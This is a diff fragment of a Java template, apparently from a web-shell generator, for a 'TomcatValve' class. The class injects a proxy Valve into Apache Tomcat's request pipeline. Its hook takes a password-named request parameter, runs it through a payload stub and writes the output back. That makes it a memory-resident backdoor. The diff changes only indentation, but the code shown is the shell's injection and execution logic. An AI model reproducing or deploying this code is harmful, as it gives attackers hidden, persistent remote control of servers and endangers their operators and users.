@@ -11,10 +11,10 @@ public class TomcatValve extends ClassLoader implements InvocationHandler {{
 {stub}
     private void hook(Object request, Object response) throws Exception {{
         String payload = (String) invokeMethod(
-                request, "getParameter", password
+            request, "getParameter", password
         );
         invokeMethod(
-                invokeMethod(response, "getWriter"),
+            invokeMethod(response, "getWriter"),
                 "write", stub(payload, request, response)
         );
     }}
@@ -54,15 +54,15 @@ public class TomcatValve extends ClassLoader implements InvocationHandler {{
             Class valveClass = null;
             try {{
                 valveClass = Class.forName(
-                        "org.apache.catalina.Valve"
+                    "org.apache.catalina.Valve"
                 );
             }} catch (ClassNotFoundException e) {{}}
 
             if (valveClass != null) {{
                 Object proxyObject = Proxy.newProxyInstance(
-                        getLoader(),
-                        new Class[]{{valveClass}},
-                        this
+                    getLoader(),
+                    new Class[]{{valveClass}},
+                    this
                 );
                 try {{
                     addValve(proxyObject);
